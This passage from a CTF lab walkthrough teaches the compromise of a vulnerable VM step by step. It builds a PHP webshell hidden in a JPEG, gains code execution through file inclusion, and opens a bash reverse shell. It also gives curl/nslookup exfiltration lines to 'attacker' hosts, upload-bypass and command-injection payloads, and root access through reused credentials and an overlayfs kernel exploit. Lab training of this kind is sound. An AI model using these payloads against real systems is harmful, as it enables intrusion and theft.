2. `panel.php`'s `load=` parameter feeds **`include()`** — PHP executes whatever file
   it is pointed at.
3. `include()` can be pointed at any path under the web root, including
   `/uploaded_images/`.

So: **hide PHP inside a real JPEG, upload it, then include it.**

### 4.2 Build the polyglot image

**Method A — `exiftool` (cleanest):**


> ### 📖 Concept — Steganography and file carving
>
> CTF authors hide data in files constantly. Know the layers, cheapest first:
>
> | Layer | Tool | What it finds |
> | --- | --- | --- |
> | **Metadata** | `exiftool img.jpg` | Comments, GPS, software version, **author**, dates |
> | **Trailing data** | `binwalk img.jpg`, `strings`, `xxd` | A ZIP or text appended *after* the image's end-of-file marker |
> | **Embedded files** | `binwalk -e`, `foremost`, `scalpel` | Carves out files hidden inside another |
> | **LSB steganography** | `zsteg`, `stegsolve` | Payload in the least-significant bits of pixel data |
> | **Password-protected** | `steghide extract -sf img.jpg` | Data hidden with a passphrase (try the box's other creds) |
>
> ```bash
> exiftool image.jpg
> binwalk image.jpg
> strings -n 6 image.jpg | head -50
> zsteg -a image.png
> steghide extract -sf image.jpg
> ```
>
> **Start with `exiftool` and `binwalk`.** They are instant and they account for most
> CTF "steganography" — which is usually just *a file appended to another file* or *a
> comment in the metadata*, not real LSB embedding. `binwalk` reporting a `Zip archive
> data` at a non-zero offset means exactly that: two files concatenated.
>
> If a ZIP is recovered and password-protected: `zip2john file.zip > zip.hash` then
> `john --wordlist=rockyou.txt zip.hash`, or `fcrackzip -D -u -p dict.txt file.zip`.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
# a genuine 1x1 JPEG so finfo sniffs image/jpeg
cp /usr/share/wordlists/dirb/others/../../doc/images/logo-debian.jpg real.jpg 2>/dev/null \
  || convert -size 64x64 xc:black real.jpg

# put PHP in the JPEG's Comment field
exiftool -Comment='<?php system($_REQUEST["cmd"]); ?>' real.jpg
mv real.jpg shell.jpg
exiftool shell.jpg | grep -i comment
```

```text
Comment                         : <?php system($_REQUEST["cmd"]); ?>
```

```bash
file shell.jpg
```

```text
shell.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "<?php system($_REQUEST["cmd"]); ?>", baseline, precision 8, 64x64, frames 3
```

> **`file` reports `image/jpeg` *and* shows the comment** — proof the payload is
> embedded without breaking the format. `finfo(FILEINFO_MIME)` reads the same magic
> bytes, so the MIME check in `add.php` will pass.
>
> **Why a JPEG tolerates this:** the JPEG format is a sequence of *segments*, each
> starting with `0xFF` and a marker byte. The **COM segment (`0xFFFE`)** is explicitly
> defined for arbitrary text and is ignored by every decoder. EXIF (APP1, `0xFFE1`)
> works the same way. Decoders skip them; PHP does not care, because PHP is not
> decoding the image at all — it is executing the bytes it finds between `<?php` and
> `?>`.

**Method B — append PHP after a valid image (the crude version):**

```bash
convert -size 64x64 xc:black base.jpg
printf '<?php system($_REQUEST["cmd"]); ?>' > payload.php
cat base.jpg payload.php > shell.jpg
file shell.jpg
```

```text
shell.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 64x64, frames 3
```

> `file` reads only the header, so it still says JPEG. Most `finfo` implementations
> agree. Method A is more robust; Method B is what to fall back on if `exiftool` is
> unavailable.

**Method C — GIF with an inline header** (some boxes only accept GIF):

```bash
printf 'GIF89a;\n<?php system($_REQUEST["cmd"]); ?>\n' > shell.gif
file shell.gif
```

```text
shell.gif: GIF image data, version 89a, 12331 x 29301
```

### 4.3 Check what is already there

The author left a **test file** proving the technique works:

```bash
curl -s http://192.168.56.107/uploaded_images/
```

```text
Index of /uploaded_images

[IMG] c.JPG      04-Apr-2017 12:11   18K
[IMG] image.jpg  04-Apr-2017 12:14  4.2K
```

```bash
exiftool <(curl -s http://192.168.56.107/uploaded_images/c.JPG) | grep -i -A3 comment
```

```text
Comment                         : <?php phpinfo(); ?>
```

> **`c.JPG` already contains `<?php phpinfo(); ?>` in its comment.** The developer
> left their own proof-of-concept in production. Two lessons: (1) *always check what
> is already in an upload directory* — someone may have done your work; (2) test
> artefacts left in production are a real finding, not just a CTF convenience.

### 4.4 Upload it

Set up Burp Suite as your browser proxy (*Proxy → Open Browser*), log into
`panel.php` with the SQLi payload from § 3.2, choose **Add User**, and fill the form:

```text
Name:     shell
Address:  /tmp
ID:       999
Image:    [browse to shell.jpg]
```

Click **Upload**. The application responds:

```text
Uploaded successfully
```

Confirm it landed:

```bash
curl -sI http://192.168.56.107/uploaded_images/shell.jpg
```

```text
HTTP/1.1 200 OK
Date: Sat, 04 May 2024 13:28:41 GMT
Server: Apache/2.2.22 (Ubuntu) PHP/5.3.10-1ubuntu3.7 with Suhosin-Patch
Last-Modified: Sat, 04 May 2024 13:28:39 GMT
ETag: "2a3f1-1b7c-5f1a2b3c4d5e6"
Accept-Ranges: bytes
Content-Length: 7036
Content-Type: image/jpeg
```

> **`Content-Type: image/jpeg`** — exactly what we wanted. Requested directly, Apache
> serves it as a picture. The PHP inside is inert… until something `include()`s it.

### 4.5 Include it — and get code execution

```bash
curl -s -b cookies.txt -X POST http://192.168.56.107/panel.php \
  --data "continue=Show Users" \
  --data-urlencode "load=uploaded_images/shell.jpg" \
  --data-urlencode "cmd=id"
```

```html
<div align=center><form method=post>
<input type=submit name=continue value="Show Users">
<input type=submit name=continue value="Add User">
</form></div>
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Remote code execution.** `uid=33(www-data)` is Debian/Ubuntu's Apache worker user.

A few more probes:

```bash
for c in "uname -a" "hostname" "pwd" "ls -la /var/www" "which wget curl python php gcc nc"; do
  echo "### $c"
  curl -s -b cookies.txt -X POST http://192.168.56.107/panel.php \
    --data "continue=Show Users" \
    --data-urlencode "load=uploaded_images/shell.jpg" \
    --data-urlencode "cmd=$c" | grep -v '<div\|<input\|</form\|</div'
done
```


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```text
### uname -a
Linux indishell 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:08:14 UTC 2014 i686 i686 i686 GNU/Linux
### hostname
indishell
### pwd
/var/www
### ls -la /var/www
total 96
drwxr-xr-x  5 root     root     4096 Apr  4  2017 .
drwxr-xr-x 13 root     root     4096 Apr  4  2017 ..
-rw-r--r--  1 root     root      118 Apr  4  2017 add.php
-rw-r--r--  1 root     root       72 Apr  4  2017 c.php
drwxr-xr-x  2 www-data www-data 4096 Apr  4  2017 phpmy
-rw-r--r--  1 root     root     1083 Apr  4  2017 index.php
-rw-r--r--  1 root     root     1420 Apr  4  2017 panel.php
-rw-r--r--  1 root     root      340 Apr  4  2017 show.php
-rw-r--r--  1 root     root      190 Apr  4  2017 test.php
drwxrwxr-x  2 www-data www-data 4096 May  4 13:28 uploaded_images
### which wget curl python php gcc nc
/usr/bin/wget
/usr/bin/curl
/usr/bin/python
/usr/bin/php
/usr/bin/gcc
```

> **Hostname `indishell`** — the author's handle. **Kernel `3.13.0-24-generic i686`**
> (32-bit Ubuntu 14.04) — that is inside the vulnerable range for the overlayfs
> exploit, which gives us a kernel-based alternative in § 5.3.
>
> **`wget`, `curl`, `python`, `php` and `gcc` all exist.** Plenty of options for
> staging and for compiling.

### 4.6 Upgrade to a reverse shell

Driving commands through `curl` is fine for probing but useless for interactive work.


> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)
> ### 📖 Concept — Command injection
>
> The application passes your input to a shell:
>
> ```php
> system("ping -c 4 " . $_GET['host']);
> ```
>
> Break out with a shell **metacharacter** and append your own command:
>
> | Payload | Effect |
> | --- | --- |
> | `; id` | Run sequentially, regardless |
> | `\| id` | Pipe — run next |
> | `\|\| id` | Run only if the first **failed** |
> | `&& id` | Run only if the first **succeeded** |
> | `` `id` `` | Command substitution |
> | `$(id)` | Command substitution — preferred, nestable |
> | `%0a id` | A URL-encoded **newline** — works when `;` and `\|` are filtered |
>
> **When output comes back**, you are done: `<host>;id` prints the result.
>
> **When it does not** ("blind" injection), exfiltrate out-of-band:
>
> ```bash
> $(curl http://attacker/$(whoami))        # data in the URL of a request YOU receive
> $(nslookup $(whoami).attacker.com)       # data in DNS — survives most egress rules
> ; sleep 10                               # a pure timing oracle, needs no network at all
> ```
>
> Run your listener first (`nc -lvnp 80`, or `python3 -m http.server`) and **watch its
> log** — a request arriving with the hostname embedded is your proof, and the log also
> tells you which payload variant the filter allowed through.
>
> **If characters are stripped**, find out exactly what survives. Submit `;|&$\`(){}[]<>`
> as a single string and see which ones come back. Filters are usually a `str_replace`
> of a short list, and almost always miss something — commonly newline, or a doubled
> character (`;;` collapsing to `;` after one removal pass).
>
> **Deep dive:** [CONCEPTS §13.4 — Command injection](../../docs/CONCEPTS.md#134-command-injection)

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./rev.php
sed -i "s/127.0.0.1/192.168.56.10/" rev.php
sed -i "s/1234/4444/" rev.php
exiftool -Comment="$(cat rev.php)" real.jpg
mv real.jpg revshell.jpg
```

Upload `revshell.jpg` through the panel exactly as in § 4.4, then:

**Kali — listen:**

```bash
nc -lvnp 4444
```

**Trigger:**

```bash
curl -s -b cookies.txt -X POST http://192.168.56.107/panel.php \
  --data "continue=Show Users" \
  --data-urlencode "load=uploaded_images/revshell.jpg" >/dev/null
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.107] 52118
Linux indishell 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:08:14 UTC 2014 i686 i686 i686 GNU/Linux
 09:34:11 up 41 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

**Stabilise:**


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@indishell:/var/www$ export TERM=xterm
www-data@indishell:/var/www$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then `Ctrl+Z`, `stty raw -echo; fg`, Enter, Enter, `export TERM=xterm`,
`stty rows 40 cols 160`.

![Reverse shell as www-data](images/05-shell.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 5. Privilege escalation

### 5.1 Run the checklist first


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)
> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)
> ### 📖 Concept — Cron jobs, and pspy for the ones you cannot see
>
> **cron** runs commands on a schedule. Jobs may be defined per-user
> (`crontab -l`), system-wide (`/etc/crontab`), or as drop-ins (`/etc/cron.d/`,
> `/etc/cron.{hourly,daily,weekly,monthly}/`).
>
> ```bash
> cat /etc/crontab
> ls -la /etc/cron.*
> crontab -l
> ls -la /var/spool/cron/crontabs/
> ```
>
> The `/etc/crontab` fields are `min hour dom mon dow **user** command` — note the
> *user* column, which per-user crontabs do not have. That column is what makes a
> system cron job run as root.
>
> **Three exploitable patterns:**
>
> 1. **The script itself is writable** → append
>    `cp /bin/bash /tmp/rb; chmod +s /tmp/rb`, wait, then run `/tmp/rb -p`.
> 2. **The script calls a binary by a relative name** (`service`, `tar`, `python`) →
>    **PATH hijack**: create `~/evil/service` containing your payload and
>    `export PATH=~/evil:$PATH`. Check whether cron's own `PATH=` line defeats this.
> 3. **Wildcard injection** — a job runs `tar czf backup.tar.gz *` → create files
>    named `--checkpoint=1` and `--checkpoint-action=exec=/tmp/shell.sh`. `tar` reads
>    them as options rather than filenames.
>
> > **The critical gap: root cron jobs that appear in *no* crontab.** They may be
> > installed by a systemd timer, an init script, or a custom daemon.
> >
> > **`pspy` finds them.** It polls `/proc` in a tight loop and therefore sees
> > processes started by *other users* — **without needing root**. Run it and wait 60
> > seconds:
> >
> > ```bash
> > ./pspy64 -pf
> > # watch for: root running /opt/script.py every 5 seconds
> > ```
> >
> > It has won more CTF boxes than almost any other single tool. If `sudo -l`, SUID
> > and capabilities are all dead ends, **run pspy before giving up.**
>
> **Deep dive:** [CONCEPTS §15.5 — Cron jobs](../../docs/CONCEPTS.md#155-cron-jobs)

```bash
www-data@indishell:/$ sudo -l
sudo: no tty present and no askpass program specified

www-data@indishell:/$ find / -perm -4000 -type f 2>/dev/null
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/umount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/usr/sbin/pppd

www-data@indishell:/$ cat /etc/crontab
```

```text
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

> All stock. No SUID abuse, no sudo, no custom cron. **But remember the web page we
> could not reach: `/phpmy/`.** Go look at it from the inside.

### 5.2 The intended path — phpMyAdmin's config holds root's password

```bash
www-data@indishell:/$ ls -la /var/www/phpmy/
total 100
drwxr-xr-x  2 www-data www-data  4096 Apr  4  2017 .
drwxr-xr-x  5 root     root      4096 Apr  4  2017 ..
-rw-r--r--  1 www-data www-data  4487 Apr  4  2017 config.inc.php
-rw-r--r--  1 www-data www-data  1573 Apr  4  2017 index.php
...
www-data@indishell:/$ grep -n "user\|password\|Servers" /var/www/phpmy/config.inc.php
```

```text
31:$cfg['Servers'][$i]['auth_type'] = 'config';
32:$cfg['Servers'][$i]['user'] = 'root';
33:$cfg['Servers'][$i]['password'] = 'roottoor';
34:$cfg['Servers'][$i]['host'] = '127.0.0.1';
35:$cfg['Servers'][$i]['AllowNoPassword'] = false;
```

> **phpMyAdmin is configured in `config` auth mode with hard-coded MySQL root
> credentials: `root` / `roottoor`.**
>
> `auth_type = 'config'` means phpMyAdmin never asks the user for credentials — it
> uses the ones baked into the file. That is convenient and catastrophic.
>
> **Now try those credentials everywhere.** Credential reuse is the pattern:

```bash
www-data@indishell:/$ mysql -h 127.0.0.1 -u root -proottoor -e 'select user,host from mysql.user;'
```

```text
+------------------+-----------+
| user             | host      |
+------------------+-----------+
| root             | 127.0.0.1 |
| root             | indishell |
| root             | localhost |
| billu            | localhost |
+------------------+-----------+
```

```bash
www-data@indishell:/$ ssh root@127.0.0.1
root@127.0.0.1's password: roottoor
Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic i686)

 * Documentation:  https://help.ubuntu.com/
Last login: Sat May  4 09:41:02 2024
root@indishell:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Root.** ✅

> **Why `roottoor` is also the *system* root password:** the author set them the same
> so the box resolves cleanly, and because it mirrors reality — administrators reuse
> the password they put in a config file. On a real engagement you would try any
> recovered credential against SSH, `su`, the database, the CMS admin, and any VPN.
>
> **If the reuse does not hold on your copy**, use the MySQL root access instead:
> ```bash
> mysql -h 127.0.0.1 -u root -proottoor -e "
>   SELECT LOAD_FILE('/etc/shadow');"
> ```
> MySQL running as root plus `FILE` privilege lets you read arbitrary host files.

### 5.3 Alternative path — overlayfs kernel exploit (CVE-2015-1328)

Kernel `3.13.0-24-generic` is inside the vulnerable range `3.13.0 < 3.19`.


> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit ubuntu 14.04 local
```


> ### 📖 Concept — Kernel exploits: how to match one, and why to use them last
>
> ```bash
> uname -a; cat /proc/version; cat /etc/os-release
> searchsploit linux kernel $(uname -r | cut -d- -f1)
> ```
>
> Cross-reference the version at <https://www.linuxkernelcves.com/> and
> <https://github.com/SecWiki/linux-kernel-exploits>. Frequent favourites:
>
> | Exploit | Kernel | Mechanism |
> | --- | --- | --- |
> | **Dirty COW** (CVE-2016-5195) | < 4.8.3 | Race in copy-on-write → write any file |
> | **Overlayfs** (CVE-2015-1328) | Ubuntu 3.13–3.19 | Namespace + setuid → root |
> | **PwnKit** (CVE-2021-4034) | polkit < 0.120 | `pkexec` memory corruption |
> | **Baron Samedit** (CVE-2021-3156) | sudo < 1.9.5p2 | `sudoedit` heap overflow |
> | **Dirty Pipe** (CVE-2022-0847) | 5.8 – 5.16.11 | Page-cache write → overwrite any file |
>
> **Match the architecture too.** A 32-bit target (`i686` in `uname -a`) needs the
> 32-bit build; a mismatched exploit fails with a confusing error. Compile with the
> flags the author specifies — Dirty COW's `40847.cpp` needs
> `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil`.
>
> > ⚠️ **Use kernel exploits last.** They can panic the VM, corrupt the filesystem
> > and cost you a full re-import. If a clean misconfiguration path exists — `sudo`,
> > SUID, capabilities, cron, a writable file — take it. Kernel exploitation is the
> > fallback when the administrator got everything else right.
>
> **Read the exploit before running it.** Many public entries are unverified and some
> are hostile to whoever runs them. `searchsploit -x <id>` and understand it.
>
> **Deep dive:** [CONCEPTS §15.7 — Kernel exploits](../../docs/CONCEPTS.md#157-kernel-exploits)

```text
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Esc | linux/local/37292.c
----------------------------------------------------------------------------------------------- ---------------------------------
```

**Kali:**

```bash
searchsploit -m linux/local/37292.c
mv 37292.c ofs.c
python3 -m http.server 8000
```

```text
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Target:**

```bash
www-data@indishell:/tmp$ wget http://192.168.56.10:8000/ofs.c
--2024-05-04 09:46:12--  http://192.168.56.10:8000/ofs.c
Connecting to 192.168.56.10:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4982 (4.9K) [text/x-csrc]
Saving to: 'ofs.c'

100%[======================================>] 4,982       --.-K/s   in 0s

2024-05-04 09:46:12 (512 MB/s) - 'ofs.c' saved [4982/4982]

www-data@indishell:/tmp$ gcc -o ofs ofs.c
www-data@indishell:/tmp$ ./ofs
```

```text
spawnining threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# whoami
root
```

> **How CVE-2015-1328 works.** **OverlayFS** layers a writable *upper* directory over
> a read-only *lower* one and presents the merged view — the mechanism every container
> image uses. Ubuntu backported it and allowed **unprivileged users** to mount it in a
> *user namespace*. The bug: files copied up from the lower layer **kept their original
> root ownership and SUID bit**, but landed in a directory the unprivileged user could
